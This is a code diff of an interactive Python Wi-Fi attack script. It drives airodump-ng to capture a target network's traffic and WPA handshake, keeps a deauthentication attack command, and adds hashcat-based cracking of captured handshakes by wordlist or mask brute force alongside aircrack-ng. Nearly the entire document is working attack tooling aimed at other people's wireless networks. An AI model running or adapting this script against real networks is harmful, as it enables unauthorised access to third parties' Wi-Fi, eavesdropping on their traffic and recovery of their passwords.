@@ -158,8 +158,7 @@ def d_target(L):
             add(L)
             return L
         elif choice == "new":
-            L = []
-            add(L)
+            L = add([])
             return L 
     
 #function that scans one wifi
@@ -172,12 +171,16 @@ def capture(wl):
     except:
         print("")
     
-    d = os.getcwd()+"/captures/"+target[2]
-    subprocess.run(["gnome-terminal","--","sudo" , "airodump-ng" , "-w" , d , "-c" , target[1] , "--bssid" , target[0] , wl])
-
+    try:
+        d = os.getcwd()+"/captures/"+target[2]
+        subprocess.run(["gnome-terminal","--","sudo" , "airodump-ng" , "-w" , d , "-c" , target[1] , "--bssid" , target[0] , wl])
+    except:
+        print("WHAT ?? DO YOU WANT ME TO LISTEN TO AIR ?? GIVE ME A TARGET")
 def spy(wl):
-    subprocess.run(["gnome-terminal","--","sudo" , "airodump-ng" , "--bssid" , target[0] ,"-c" , target[1] , wl])
-
+    try:
+        subprocess.run(["gnome-terminal","--","sudo" , "airodump-ng" , "--bssid" , target[0] ,"-c" , target[1] , wl])
+    except:
+        print("WHAT ?? DO YOU WANT ME TO LISTEN TO AIR ?? GIVE ME A TARGET")
 #function that runs the attack against the target
 def attack(wl):
     try:
@@ -209,82 +212,263 @@ def attack(wl):
 
 #function to crack the wpa-handshake
 def crack():
-    l = subprocess.check_output(['ls']).decode("850").split("\n")
-    directory = os.getcwd()
-    try:
-        # We make a new directory called /backup
-        os.mkdir(directory + "/wordlists/")
-    except:
-        print("")
-
-    print("--> You can add wordlists in the wordlists directory so that you can use them without entering their path")
-    try:
-        # creating a list l containing the '.cap" files in backup and current directories
-        l1 = subprocess.check_output(['ls' , 'captures']).decode("850").split("\n")
-        l2 = subprocess.check_output(['ls' , 'wordlists']).decode("850").split("\n")
-        cap = []
-        for k in l1:
-            if ".cap" in k:
-                cap.append(k)
-        # listing the availables '.cap" files
-        for k in cap:
-            print(f"{cap.index(k)} - {k}")
-
-        ind = []
-        for i in range(len(cap)):
-            ind.append(str(i))
-
-        while True:
-            choice = input("Choose the '.cap' file that you want to crack (or enter - other - to enter the path of another file) : ")
-            if choice.lower() == "other" or choice == "OTHER" or choice in ind:
-                break
+    print("What do you want to use for cracking : ")
+    print("1- aircrack-ng  (slow)")
+    print("2- hashcat (fast) (requires hcxtools and gpu driver)")
+    print()
+    choice = int(input("    [ 1 / 2 ]    :  "))
+    if choice == 1:
+        directory = os.getcwd()
         try:
-            file = directory+"/captures/"+cap[int(choice)]
+            # We make a new directory called /backup
+            os.mkdir(directory + "/wordlists/")
         except:
-            file = input("Enter the path of the '.cap' file that you want to crack : ")
+            print("")
 
-        # the txt file will be organised as (name of the file , path of the file)
-        txt = [("rockyou.txt" , "/usr/share/wordlists/rockyou.txt") , ("fasttrack.txt" , "/usr/share/wordlists/fasttrack.txt")]
-        for t in l2:
-            if ".txt" in t:
-                txt.append((t,directory+"/wordlists/"+t))
-
-        for i in range(len(txt)):
-            for j in range(2):
-                if "\n" in txt[i][j]:
-                    txt[i] = txt[i][0:len(txt[i])-1]
-
-        ind2 = []
-        for j in range(len(txt)):
-            ind2.append(str(j))
-
-        for t in txt:
-            print(f"{txt.index(t)} - {t[0]}")
-        while True:
-            choice = input("Choose the wordlist you'll use (or enter - other - to enter the path of another wordlist) : ")
-            if choice.lower() == "other" or choice == "OTHER" or choice in ind2:
-                break
-
+        print("--> You can add wordlists in the wordlists directory so that you can use them without entering their path")
         try:
-            wordlist = txt[int(choice)][1]
+            # creating a list l containing the '.cap" files in backup and current directories
+            l1 = subprocess.check_output(['ls' , 'captures']).decode("850").split("\n")
+            l2 = subprocess.check_output(['ls' , 'wordlists']).decode("850").split("\n")
+            cap = []
+            for k in l1:
+                if ".cap" in k:
+                    cap.append(k)
+            # listing the availables '.cap" files
+            for k in cap:
+                print(f"{cap.index(k)} - {k}")
 
+            ind = []
+            for i in range(len(cap)):
+                ind.append(str(i))
+
+            while True:
+                choice = input("Choose the '.cap' file that you want to crack (or enter - other - to enter the path of another file) : ")
+                if choice.lower() == "other" or choice == "OTHER" or choice in ind:
+                    break
+            try:
+                file = directory+"/captures/"+cap[int(choice)]
+            except:
+                file = input("Enter the path of the '.cap' file that you want to crack : ")
+
+            # the txt file will be organised as (name of the file , path of the file)
+            txt = [("rockyou.txt" , "/usr/share/wordlists/rockyou.txt") , ("fasttrack.txt" , "/usr/share/wordlists/fasttrack.txt")]
+            for t in l2:
+                if ".txt" in t:
+                    txt.append((t,directory+"/wordlists/"+t))
+
+            for i in range(len(txt)):
+                for j in range(2):
+                    if "\n" in txt[i][j]:
+                        txt[i] = txt[i][0:len(txt[i])-1]
+
+            ind2 = []
+            for j in range(len(txt)):
+                ind2.append(str(j))
+
+            for t in txt:
+                print(f"{txt.index(t)} - {t[0]}")
+            while True:
+                choice = input("Choose the wordlist you'll use (or enter - other - to enter the path of another wordlist) : ")
+                if choice.lower() == "other" or choice == "OTHER" or choice in ind2:
+                    break
+
+            try:
+                wordlist = txt[int(choice)][1]
+
+            except:
+                wordlist = input("Enter the path of the wordlist that you want to use: ")
+
+            subprocess.run(["sudo" , "aircrack-ng" , file , "-w" , wordlist])
+        except KeyboardInterrupt:
+            print()
+    elif choice == 2:
+        directory = os.getcwd()
+        try:
+            # We make a new directory called /backup
+            os.mkdir(directory + "/wordlists/")
         except:
-            wordlist = input("Enter the path of the wordlist that you want to use: ")
+            print("")
 
-        subprocess.run(["sudo" , "aircrack-ng" , file , "-w" , wordlist])
-    except KeyboardInterrupt:
-        print()
+        print("--> You can add wordlists in the wordlists directory so that you can use them without entering their path")
+        try:
+            # creating a list l containing the '.cap" files in backup and current directories
+            l1 = subprocess.check_output(['ls' , 'captures']).decode("850").split("\n")
+            l2 = subprocess.check_output(['ls' , 'wordlists']).decode("850").split("\n")
+            cap = []
+            for k in l1:
+                if ".cap" in k:
+                    cap.append(k)
+            # listing the availables '.cap" files
+            for k in cap:
+                print(f"{cap.index(k)} - {k}")
+
+            ind = []
+            for i in range(len(cap)):
+                ind.append(str(i))
+
+            while True:
+                choice = input("Choose the '.cap' file that you want to crack (or enter - other - to enter the path of another file) : ")
+                print()
+                if choice.lower() == "other" or choice == "OTHER" or choice in ind:
+                    break
+            try:
+                file = directory+"/captures/"+cap[int(choice)]
+            except:
+                file = input("Enter the path of the '.cap' file that you want to crack : ")
+
+            F = file.split("/")
+
+            for file_name in os.listdir():
+                """
+                letting only one .hc22000 in the directory to keep things organised.
+                """
+
+                if ".hc22000" in file_name:
+                    print("We found .hc22000 files in your directory and will move them to the backup directory.")
+                    print()
+                    # We get the current working directory.
+                    directory = os.getcwd()
+                    try:
+                        # We make a new directory called /backup
+                        os.mkdir(directory + "/backup/")
+                    except:
+                        print("")
+                    # Create a timestamp
+                    timestamp = datetime.now()
+                    # We move any .csv files in the folder to the backup folder.
+                    shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)
+            try:
+                file_formatted = F[-1].split(".")[0]+".hc22000"
+                subprocess.run(["sudo" , "hcxpcapngtool" , "-o" , file_formatted , file  ])  
+                print()
+      
+            except:
+                print("   - x - ERROR, verify that you installed 'hcxpcapngtool'")
+             
+                return 0
+            print()
+            print("Do you want to brute force or use a wordlist( which is a brute force too lol but less brute) ? ")
+            print("1- Wordlist")
+            print("2- Bruteforce")
+            print()
+            c_type = 0
+            while c_type not in [1,2]:
+                c_type = int(input("  [ 1 / 2 ]  :  "))
+            if c_type == 1:
+                # the txt file will be organised as (name of the file , path of the file)
+                txt = [("rockyou.txt" , "/usr/share/wordlists/rockyou.txt") , ("fasttrack.txt" , "/usr/share/wordlists/fasttrack.txt")]
+                for t in l2:
+                    if ".txt" in t:
+                        txt.append((t,directory+"/wordlists/"+t))
+
+                for i in range(len(txt)):
+                    for j in range(2):
+                        if "\n" in txt[i][j]:
+                            txt[i] = txt[i][0:len(txt[i])-1]
+
+                ind2 = []
+                for j in range(len(txt)):
+                    ind2.append(str(j))
+
+                for t in txt:
+                    print(f"{txt.index(t)} - {t[0]}")
+                while True:
+                    choice = input("Choose the wordlist you'll use (or enter - other - to enter the path of another wordlist) : ")
+                    if choice.lower() == "other" or choice == "OTHER" or choice in ind2:
+                        break
+
+                try:
+                    wordlist = txt[int(choice)][1]
+
+                except:
+                    wordlist = input("Enter the path of the wordlist that you want to use: ")
+
+                subprocess.run(["sudo" , "hashcat" , "-m" , "22000" , file_formatted  ,wordlist])    
+                print("")
+                print("                     AAAAAAnd the password is :  ")
+                subprocess.run(["sudo" , "hashcat" , "-m" , "22000" , file_formatted  ,wordlist,"--show"])
+            elif c_type == 2:
+                print("What do you want to use :")
+                print("1) abcdefghijklmnopqrstuvwxyz")
+                print("2) ABCDEFGHIJKLMNOPQRSTUVWXYZ")
+                print("3) 0123456789")
+                print("4) 0123456789abcdef")
+                print("5) 0123456789ABCDEF")
+                we = 0
+                while we not in [1,2,3,4,5]:
+                    we = int(input("   [ 1 - 5 ]  :  "))
+                
+                WE = ["?l","?u","?d","?h","?H"]
+         
+                length = int(input("   Enter the suposed length of the password : "))
+             
+                subprocess.run(["sudo" , "hashcat" , "-m" , "22000" , file_formatted ,"-a", "3" ,f"{WE[we-1]*length}"])
+                print()
+                print("                     AAAAAAnd the password is :  ")
+                subprocess.run(["sudo" , "hashcat" , "-m" , "22000" , file_formatted ,"-a", "3" ,f"{WE[we-1]*length}","--show"])
+
+        except KeyboardInterrupt:
+            print()
 
 #function to delete the backup and the captures directories
 def clear():
     print("Do you want to delete the backup or the captures directory ?")
     ch = "choice"
-    while ch.lower() != "backup" and ch.lower() != "captures":
-        ch = input(" [ backup / captures ]  :  ")
+    while ch.lower() not in ["captures","c","backup","b"]:
+        ch = input(" [ backup / captures ]  [ b / c ]:  ")
     ch = ch.lower()
-    subprocess.run(["sudo" , "rm" , "-r" , ch])
+    if ch == "captures" or ch == "c":
+        
+        choice = ""
+        while choice.lower() != "all" and choice.lower() != "nall":
+            choice = input("Do you want to clear all the directory or only some files ?  [all/nall]  : ")
+        choice = choice.lower()
 
-    
+        if choice == "all":
+            subprocess.run(["sudo" , "rm" , "-r" , "captures"])
+        else:
+            
+            l1 = subprocess.check_output(['ls' , 'captures']).decode("850").split("\n")
+        
+            cap = []
+            for k in l1:
+                if ".cap" in k:
+                    cap.append(k)
+            # listing the availables '.cap" files
+            if cap == []:
+                print("No files to delete")
+                return None
+                
+            for k in cap:
+                print(f"{cap.index(k)} - {k}")
+
+            ind = []
+            for i in range(len(cap)):
+                ind.append(str(i))
+            CH = []
+            while True:
+                choice = input("Choose the files you want to clear (let empty to stop): ")
+                if choice =="":
+                    break
+                elif choice in ind:
+                    CH.append(choice)
+                else:
+                    print("Invalid choice.")
+                
+            directory = os.getcwd()  
+            EXT = [".cap",".csv",".kismet.csv",".kismet.netxml",".log.csv"]
+            for k in CH:
+                for ext in EXT:
+                 
+                    file = directory+"/captures/"+cap[int(k)].split(".")[0]+ext
+                    subprocess.run(["sudo" , "rm" , file])
+            
+                
+    elif ch == "backup" or ch == "b":
+        subprocess.run(["sudo" , "rm" , "-r" , "backup"])
+
+
 #function to undo the start function and to end the script
 def quit(wl):
     print(f"Putting {wl} into managed mode ...")
@@ -303,6 +487,7 @@ def help():
     print("- target device - to choose the devices connected to the target that you want to aim at")
     print("- show target - to display the chosen target")
     print("- show target device - to display the list of the devices that will be used for the precise attack")
+    print("- spy - to see the target's traffic, without capturing") 
     print("- capture - to listen on the target (on a new terminal)")
     print("- deauth - to perform the attack on the target")
     print("- crack - to crack the wpa-handshake")
@@ -373,7 +558,7 @@ while True:
 
         elif choice == "scan":
             active_wireless_networks = scan(wlan)
-
+            print("If no target is shown and there are present wifis nearby, use the command fix and try again")
         elif choice == "target":
             target = main_target()
             try:
@@ -384,7 +569,7 @@ while True:
             spy(wlan)
             
         elif choice == "target device":
-            d_target(l)
+            l = d_target(l)
             
         elif choice == "show target":
             print(target)
@@ -410,9 +595,10 @@ while True:
 
         elif choice == "fix":
             wlan += "mon"            
+        
         elif choice == "help":
             help()
-            
+
         else:
             print("Unknown command use - help - to find the commands available")
             
